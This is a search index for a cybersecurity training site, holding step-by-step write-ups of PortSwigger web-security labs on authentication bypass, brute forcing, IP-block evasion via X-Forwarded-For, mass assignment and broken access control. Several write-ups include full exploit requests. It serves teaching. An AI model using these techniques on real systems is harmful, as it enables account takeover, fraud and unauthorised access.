{"config":{"separator":"[\\s\\-_,:!=\\[\\]()\\\\\"`/]+|\\.(?!\\d)"},"items":[{"location":"","level":1,"title":"Home","text":"","path":["Home"],"tags":[]},{"location":"#about-me","level":2,"title":"About Me","text":"<p>My name is Tom. I'm a husband, father, and grandfather. After I retired from the Army in 2022, I worked as a penetration tester for a few years before gravitating toward teaching. I'm now in the process of getting my own project off the ground. I started Eagle Rising Information Security to provide high-quality foundational cybersecurity content to students (or anyone else getting started). My goal is to present information in an easy to understand way, and in a manner which is accessible for anyone, regardless of where they are in their information security journey.</p>","path":["Home"],"tags":[]},{"location":"#my-philosophy","level":2,"title":"My Philosophy","text":"<ul> <li>Cybersecurity can be learned. Nobody is born just knowing all this.</li> <li>Don't try to learn everything all at once. Try to get 1% better every day.</li> <li>Everyone learns differently. Try to avoid comparing yourself to others. You don't owe anyone anything.</li> <li>Find your own flow.  Reach out on Discord</li> </ul>","path":["Home"],"tags":[]},{"location":"Resources/","level":1,"title":"Resources","text":"<p>Multiple resources, how-tos, and methodologies. Constantly updated.</p>","path":["Resources"],"tags":[]},{"location":"Resources/How-To/Create-an-Ubuntu-VM/","level":1,"title":"Create an Ubuntu VM","text":"<p>This article will walk through creating an Ubuntu virtual machine on Windows and MacOS.</p>","path":["Resources","How To","Create an Ubuntu VM"],"tags":[]},{"location":"Resources/Interview-Questions/general/general-interview-questions/","level":1,"title":"General Cybersecurity Questions","text":"Describe the difference between encryption, encoding, and hashing <p>Coming soon</p>","path":["Resources","Interview Questions","General","General Cybersecurity Questions"],"tags":[]},{"location":"Resources/Labs/PortSwigger/API/api-lab-4/","level":1,"title":"Exploiting a mass assignment vulnerability","text":"","path":["Resources","Labs","PortSwigger","API","Exploiting a mass assignment vulnerability"],"tags":["api","mass-assignment"]},{"location":"Resources/Labs/PortSwigger/API/api-lab-4/#instructions","level":2,"title":"Instructions","text":"<p>To solve the lab, find and exploit a mass assignment vulnerability to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: <code>wiener:peter</code>.</p>","path":["Resources","Labs","PortSwigger","API","Exploiting a mass assignment vulnerability"],"tags":["api","mass-assignment"]},{"location":"Resources/Labs/PortSwigger/API/api-lab-4/#solution","level":2,"title":"Solution","text":"<p>Notice what happens if we try to check out normally without having sufficient store credit:</p> <p></p> <p>The /api/checkout endpoint returns some useful information. </p> <p>We can take that information, and plug it into a POST request to /api/checkout, setting the discount percentage to 100, thereby giving us a free jacket!</p> Final request to solve the lab<pre><code>POST /api/checkout HTTP/1.1\nHost: 0af2003003ca0bff80417c5900da0031.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0af2003003ca0bff80417c5900da0031.web-security-academy.net/cart\nContent-Type: text/plain;charset=UTF-8\nContent-Length: 53\nOrigin: https://0af2003003ca0bff80417c5900da0031.web-security-academy.net\nConnection: keep-alive\nCookie: session=OEqAEgzDEiOZhqq1cae5i1pXAT7Hcwy3\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\n{\"chosen_products\":[{\"product_id\":\"1\",\"quantity\":1}],\"chosen_discount\": {\n        \"percentage\": 100\n    }}\n</code></pre> <p>Follow the redirect and solve the lab.</p>","path":["Resources","Labs","PortSwigger","API","Exploiting a mass assignment vulnerability"],"tags":["api","mass-assignment"]},{"location":"Resources/Labs/PortSwigger/API/api-lab-4/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Keep a close eye on application responses to see if there are any hidden parameters disclosed. If there are, try sending those in requests to see if the application behavior changes at all.</p>","path":["Resources","Labs","PortSwigger","API","Exploiting a mass assignment vulnerability"],"tags":["api","mass-assignment"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-1/","level":1,"title":"Username enumeration via different responses","text":"","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via different responses"],"tags":["authn","username-enum"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p> <ul> <li>Candidate usernames</li> <li>Candidate passwords</li> </ul> <p>To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p>","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via different responses"],"tags":["authn","username-enum"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-1/#solution","level":2,"title":"Solution","text":"<p>When attempting to login with <code>tester:tester</code>, we get a message saying \"Invalid username\".</p> <p></p> <p>We can send the login request to intruder and select the username parameter. Add the list of usernames provided for this lab.</p> <p>One of the requests has a different error message, indicating an incorrect password instead of an invalid username. </p> <p></p> <p>Now we have a username, so we can just send this request back to intruder, and brute force the password with the list provided. </p> <p>Again, one of the requests is slightly different.</p> <p></p> <p>Log in with these credentials and solve the lab.</p>","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via different responses"],"tags":["authn","username-enum"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-2/","level":1,"title":"2FA simple bypass","text":"","path":["Resources","Labs","PortSwigger","Authentication","2FA simple bypass"],"tags":["authn","mfa"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.</p> <ul> <li>Your credentials: <code>wiener:peter</code></li> <li>Victim's credentials <code>carlos:montoya</code></li> </ul>","path":["Resources","Labs","PortSwigger","Authentication","2FA simple bypass"],"tags":["authn","mfa"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-2/#solution","level":2,"title":"Solution","text":"<p>First, we can log into our own account and see how the login flow works. </p> <p>After entering our credentials, we're presented a form to submit our MFA code. </p> <p></p> <p>We can check the email for the MFA code.</p> <p> The following request sends the MFA code</p> Sending the MFA code<pre><code>POST /login2 HTTP/2\nHost: 0a89006a043eb46681d875b500b800fa.web-security-academy.net\nCookie: session=Dgm7XzPmB67vOBpTUJ3KoviUjiPBwhnk\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\nOrigin: https://0a89006a043eb46681d875b500b800fa.web-security-academy.net\nReferer: https://0a89006a043eb46681d875b500b800fa.web-security-academy.net/login2\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\nmfa-code=0441\n</code></pre> <p>Then the subsequent request is:</p> Post MFA request<pre><code>GET /my-account?id=wiener HTTP/2\nHost: 0a89006a043eb46681d875b500b800fa.web-security-academy.net\nCookie: session=aUOSkOrcURGd8Pt7uCh5HprVwH1zJE73\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a89006a043eb46681d875b500b800fa.web-security-academy.net/login2\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n</code></pre> <p>What happens if we try to bypass the second login request where we send the MFA code and access the my-account page directly?</p> <p>Note there is no POST request to the /login2 endpoint.</p> <p></p> <p>We're able to navigate directly past the MFA prompt and solve the lab.</p> <p></p>","path":["Resources","Labs","PortSwigger","Authentication","2FA simple bypass"],"tags":["authn","mfa"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-3/","level":1,"title":"Password reset broken logic","text":"","path":["Resources","Labs","PortSwigger","Authentication","Password reset broken logic"],"tags":["authn","password-reset"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his \"My account\" page.</p> <ul> <li>Your credentials: <code>wiener:peter</code></li> <li>Victim's username: <code>carlos</code></li> </ul>","path":["Resources","Labs","PortSwigger","Authentication","Password reset broken logic"],"tags":["authn","password-reset"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-3/#solution","level":2,"title":"Solution","text":"<p>The login page has a forgot password functionality, where the user can enter their email to get a reset link.</p> <p></p> <p>When you get the email, there is a link with a temporary reset token. It's important to not use this token yet, otherwise you'll have to request another one. </p> <p></p> <p>Set your proxy to intercept requests and click on the reset link. Keep the intercept proxy on and enter a new password. Note that the username parameter is included in the request. </p> <p></p> <p>Change the username from \"wiener\" to \"carlos\" and forward the request.</p> <p>Now you can log in as Carlos and solve the lab.</p> <p></p>","path":["Resources","Labs","PortSwigger","Authentication","Password reset broken logic"],"tags":["authn","password-reset"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-4/","level":1,"title":"Username enumeration via subtly different responses","text":"","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via subtly different responses"],"tags":["authn","username-enum"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-4/#instructions","level":2,"title":"Instructions","text":"<p>This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p> <ul> <li>Candidate usernames</li> <li>Candidate passwords</li> </ul> <p>To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p>","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via subtly different responses"],"tags":["authn","username-enum"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-4/#solution","level":2,"title":"Solution","text":"<p>Upon trying to log in with invalid credentials, we get the following error message:</p> <p></p> <p>Note the period at the end of the message.</p> <p>Run this through intruder with the username list provided and filter on the previous error message. One username results in a request that is slightly different (no period at the end). </p> <p></p> <p>Send that request back to intruder and brute force the correct password with the list of passwords provided. </p> Successful login request<pre><code>POST /login HTTP/1.1\nHost: 0a43007d046a6c5b853a0a94005800cf.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\nOrigin: https://0a43007d046a6c5b853a0a94005800cf.web-security-academy.net\nConnection: close\nReferer: https://0a43007d046a6c5b853a0a94005800cf.web-security-academy.net/login\nCookie: session=dYbWDRS4XMQZ4kYPpHVWUKipIHLqZDVP\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n\nusername=amarillo&amp;password=123456789\n</code></pre> <p>Login as amarillo to solve the lab.</p>","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via subtly different responses"],"tags":["authn","username-enum"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-5/","level":1,"title":"Username enumeration via response timing","text":"","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via response timing"],"tags":["authn","username-enum","response-timing"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-5/#instructions","level":2,"title":"Instructions","text":"<p>This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p> <ul> <li>Your credentials: <code>wiener:peter</code></li> <li>Candidate usernames</li> <li>Candidate passwords</li> </ul> Hint <p>To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.</p>","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via response timing"],"tags":["authn","username-enum","response-timing"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-5/#solution","level":2,"title":"Solution","text":"<p>Log in with the credentials provided and note the response time. </p> <p></p> <p>Also note the response time when using an invalid username and a long, complex password. </p> <p></p> <p>The round-trip response time when trying to log in with a valid username and a long password is significantly longer. </p> <p></p> <p>We can use this to filter in intruder. </p> <p>Remember that there is a IP block in place, so in the intruder request, add an <code>X-Forwarded-For</code> header, and set it to <code>127.0.0.1</code>. Set a placeholder on the last octet, and set the payload to numbers, 1-255. Set another placeholder on the username and set the payload to the list of usernames provided. </p> <p>Start the pitchfork/parallel attack, and look for round trip time around what we noticed before for a valid username. </p> <p></p> <p>So we have a username -- <code>app</code>. Send this login request back to intruder and set the placeholders on the last octet of the X-Forwarded-For host and the password.</p> <p>Run the next parallel attack and look for a response that stands out from the rest somehow.</p> <p>There is one request that is a 302 status code, showing the correct password is <code>summer</code>. </p> <p></p> <p>Log in as the <code>app</code> user to solve the lab.</p>","path":["Resources","Labs","PortSwigger","Authentication","Username enumeration via response timing"],"tags":["authn","username-enum","response-timing"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-8/","level":1,"title":"2FA broken logic","text":"","path":["Resources","Labs","PortSwigger","Authentication","2FA broken logic"],"tags":["authn","mfa"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-8/#instructions","level":2,"title":"Instructions","text":"<p>This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.</p> <ul> <li>Your credentials: <code>wiener:peter</code></li> <li>Victim's username: <code>carlos</code></li> </ul> <p>You also have access to the email server to receive your 2FA verification code.</p>","path":["Resources","Labs","PortSwigger","Authentication","2FA broken logic"],"tags":["authn","mfa"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-8/#solution","level":2,"title":"Solution","text":"<p>When we log into our account and get the MFA code in the email client, we can see that the username is used to determine which account is being verified. </p> Username used to verify<pre><code>POST /login2 HTTP/2\nHost: 0a660055046432c782cebb6000900070.web-security-academy.net\nCookie: session=p9VYvqy3gpT5tuxmYocM1sDCWn6iMS3T; verify=wiener\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\nOrigin: https://0a660055046432c782cebb6000900070.web-security-academy.net\nReferer: https://0a660055046432c782cebb6000900070.web-security-academy.net/login2\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\nmfa-code=0000\n</code></pre> <p>To solve the lab, send the <code>GET /login2</code> request to repeater, and change the verify parameter to <code>carlos</code>. This will generate an MFA code for carlos. </p> <p>Then, log in with our credentials, but submit an invalid MFA code. Send the previously submitted <code>POST /login2</code> request to intruder and add a placeholder on the mfa-code value. Be sure to change the verify value to carlos before sending.</p> <p>Set the intruder to sniper and the payload to numbers 0000-9999. Look for the 302 status code. Once you have that, right click and select view in browser. </p> <p>Paste the generated URL into your browser and you will be dropped into carlos' account page. </p>","path":["Resources","Labs","PortSwigger","Authentication","2FA broken logic"],"tags":["authn","mfa"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-9/","level":1,"title":"Brute-forcing a stay-logged-in cookie","text":"","path":["Resources","Labs","PortSwigger","Authentication","Brute-forcing a stay-logged-in cookie"],"tags":["authn","cookies"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-9/#instructions","level":2,"title":"Instructions","text":"<p>This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.</p> <p>To solve the lab, brute-force Carlos's cookie to gain access to his My account page.</p> <ul> <li>Your credentials: <code>wiener:peter</code></li> <li>Victim's username: <code>carlos</code></li> <li>Candidate passwords</li> </ul>","path":["Resources","Labs","PortSwigger","Authentication","Brute-forcing a stay-logged-in cookie"],"tags":["authn","cookies"]},{"location":"Resources/Labs/PortSwigger/Authentication/authn-lab-9/#solution","level":2,"title":"Solution","text":"<p>When logging in an selecting the \"stay logged in\" option, we see that two cookies are set.</p> <p></p> <p>The session cookie is dynamic and changes every time we log in, but the <code>stay-logged-in</code> cookie stays the same. </p> <p>Send the login request to sequencer and analyze both cookies. The stay-logged-in cookie entropy is extremely poor.</p> <p></p> <p>The characters all stay the same, confirming what we observed from sending multiple login requests in repeater. </p> <p></p> <p>Looking at the cookie in decoder shows that it is made up of the username and an md5 hash, separated by a colon. We can use this to brute force the password for Carlos. </p> <p></p> <p>Send the request for /my-account to intruder. Change the id to carlos, and set a placeholder around the stay-logged-in cookie. Make sure to remove the session token from the intruder request. </p> <p>Set the following payload processing rules:</p> <p></p> <p>After running the attack in intruder, check for responses that stand out. </p> <p></p> <p>This solves the lab.</p>","path":["Resources","Labs","PortSwigger","Authentication","Brute-forcing a stay-logged-in cookie"],"tags":["authn","cookies"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-1/","level":1,"title":"Unprotected admin functionality","text":"","path":["Resources","Labs","PortSwigger","Authorization","Unprotected admin functionality"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab has an unprotected admin panel.</p> <p>Solve the lab by deleting the user <code>carlos</code>.</p>","path":["Resources","Labs","PortSwigger","Authorization","Unprotected admin functionality"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-1/#solution","level":2,"title":"Solution","text":"<p>Check the <code>robots.txt</code> file to find the location of the <code>/administrator-panel</code>.</p> <p></p> <p>Once there, just delete carlos and solve the lab.</p>","path":["Resources","Labs","PortSwigger","Authorization","Unprotected admin functionality"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-12/","level":1,"title":"Multi-step process with no access control on one step","text":"","path":["Resources","Labs","PortSwigger","Authorization","Multi-step process with no access control on one step"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-12/#instructions","level":2,"title":"Instructions","text":"<p>This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials <code>administrator:admin</code>.</p> <p>To solve the lab, log in using the credentials <code>wiener:peter</code> and exploit the flawed access controls to promote yourself to become an administrator.</p>","path":["Resources","Labs","PortSwigger","Authorization","Multi-step process with no access control on one step"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-12/#solution","level":2,"title":"Solution","text":"<p>Logging in with the provided administrator credentials shows an option to upgrade a user. </p> <p>Upgrading the user is a two step process:</p> <ol> <li>Select upgrade user</li> <li>Confirm the choice</li> </ol> <p>The request for the second step is as follows:</p> Upgrade confirmation request<pre><code>POST /admin-roles HTTP/1.1\nHost: 0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 45\nOrigin: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net\nConnection: keep-alive\nReferer: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net/admin-roles\nCookie: session=Eb26fNhuK8JD3jBofVGQQzID77m5Z3rb\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: orange\nPriority: u=0, i\n\naction=upgrade&amp;confirmed=true&amp;username=wiener\n</code></pre> <p>Logging out of the administrator account and into the normal 'wiener' account should allow us to send a request directly to this endpoint.</p> Upgrade request as wiener<pre><code>GET /admin HTTP/1.1\nHost: 0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0aa7004e04259e7882c2e2c0002d004e.web-security-academy.net/login\nConnection: close\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: orange\nPriority: u=0, i\nContent-Type: application/x-www-form-urlencoded\nCookie: session=IYwt1ciNjesw8A5ooVXww8B8CzMJfaIu\n</code></pre> <p></p>","path":["Resources","Labs","PortSwigger","Authorization","Multi-step process with no access control on one step"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-13/","level":1,"title":"Referer-based access control","text":"","path":["Resources","Labs","PortSwigger","Authorization","Referer-based access control"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-13/#instructions","level":2,"title":"Instructions","text":"<p>This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials <code>administrator:admin</code>.</p> <p>To solve the lab, log in using the credentials <code>wiener:peter</code> and exploit the flawed access controls to promote yourself to become an administrator.</p>","path":["Resources","Labs","PortSwigger","Authorization","Referer-based access control"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-13/#solution","level":2,"title":"Solution","text":"<p>Start off by logging in as the administrator to get familiar with the admin panel.</p> <p>Note that when we access the /admin endpoint, the referer header shows that we're coming from the administrator's account page. </p> Accessing the admin panel<pre><code>GET /admin HTTP/1.1\nHost: 0a800032034584dc80b1f30b00460008.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/my-account?id=administrator\nCookie: session=CZ8z7nRZ256lmSsNSdLdKEdkoEvvcDiy\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: green\nPriority: u=0, i\n</code></pre> <p>Also note that when we try to access the /admin endpoint while logged in as wiener, we get a 401 status code. </p> <p></p> <p>Changing the URL here didn't work, so looking back at the request to upgrade a user, we see that the referer header indicates coming from the /admin endpoint itself. </p> Upgrading a user<pre><code>GET /admin-roles?username=wiener&amp;action=upgrade HTTP/1.1\nHost: 0a800032034584dc80b1f30b00460008.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive\nReferer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/admin\nCookie: session=CZ8z7nRZ256lmSsNSdLdKEdkoEvvcDiy\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: green\nPriority: u=0, i\n</code></pre> <p>If we plug that URL in while logged in as wiener, then we're able to upgrade ourselves to an admin and solve the lab. </p> Solving the lab<pre><code>GET /admin-roles?username=wiener&amp;action=upgrade HTTP/1.1\nHost: 0a800032034584dc80b1f30b00460008.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a800032034584dc80b1f30b00460008.web-security-academy.net/admin\nConnection: keep-alive\nCookie: session=zkw8pJY9jw6amiU95SsxlSDqndiZNdml\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: green\nPriority: u=0, i\n</code></pre>","path":["Resources","Labs","PortSwigger","Authorization","Referer-based access control"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-5/","level":1,"title":"User ID controlled by request parameter","text":"","path":["Resources","Labs","PortSwigger","Authorization","User ID controlled by request parameter"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-5/#instructions","level":2,"title":"Instructions","text":"<p>This lab has a horizontal privilege escalation vulnerability on the user account page.</p> <p>To solve the lab, obtain the API key for the user <code>carlos</code> and submit it as the solution.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","path":["Resources","Labs","PortSwigger","Authorization","User ID controlled by request parameter"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-5/#solution","level":2,"title":"Solution","text":"<p>After logging in with the credentials provided we're directed to the my-account page with the following request. Note the <code>id</code> parameter.</p> Initial request<pre><code>GET /my-account?id=wiener HTTP/1.1\nHost: 0a6b00d40496130b81167f58007a00e5.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a6b00d40496130b81167f58007a00e5.web-security-academy.net/login\nConnection: keep-alive\nCookie: session=CbpTgQZBvWdK3HSu5NxzkkCBRCkiThgZ\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: orange\nPriority: u=0, i\n</code></pre> <p>To solve this lab, send this request to repeater, change the value of the <code>id</code> parameter from <code>wiener</code> to <code>carlos</code>. </p> <p>Note that we get a 200 status code and Carlos' API key is disclosed. </p> <p></p>","path":["Resources","Labs","PortSwigger","Authorization","User ID controlled by request parameter"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-9/","level":1,"title":"Insecure direct object references","text":"","path":["Resources","Labs","PortSwigger","Authorization","Insecure direct object references"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-9/#instructions","level":2,"title":"Instructions","text":"<p>This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.</p> <p>Solve the lab by finding the password for the user <code>carlos</code>, and logging into their account.</p>","path":["Resources","Labs","PortSwigger","Authorization","Insecure direct object references"],"tags":["authz"]},{"location":"Resources/Labs/PortSwigger/Authorization/authz-lab-9/#solution","level":2,"title":"Solution","text":"<p>This lab has a live chat functionality that allows downloading chat logs. Note the original chat below:</p> Original chat transcript<pre><code>GET /download-transcript/2.txt HTTP/1.1\nHost: 0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net/chat\nConnection: keep-alive\nCookie: session=u4v7AwzWpRT7ndqhIScxQr6Vig8KFD9P\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: orange\nPriority: u=0\n</code></pre> Original chat response<pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain; charset=utf-8\nContent-Disposition: attachment; filename=\"2.txt\"\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 44\n\nCONNECTED: -- Now chatting with Hal Pline --\n</code></pre> <p>To solve this lab, change the 2 to a 1 and access another user's chat history. </p> Modified request<pre><code>GET /download-transcript/1.txt HTTP/1.1\nHost: 0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a34009c04dc3ab780106cdd00ef003e.web-security-academy.net/chat\nConnection: keep-alive\nCookie: session=u4v7AwzWpRT7ndqhIScxQr6Vig8KFD9P\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: orange\nPriority: u=0\n</code></pre> <p>Note the password in the response.</p> Modified response<pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain; charset=utf-8\nContent-Disposition: 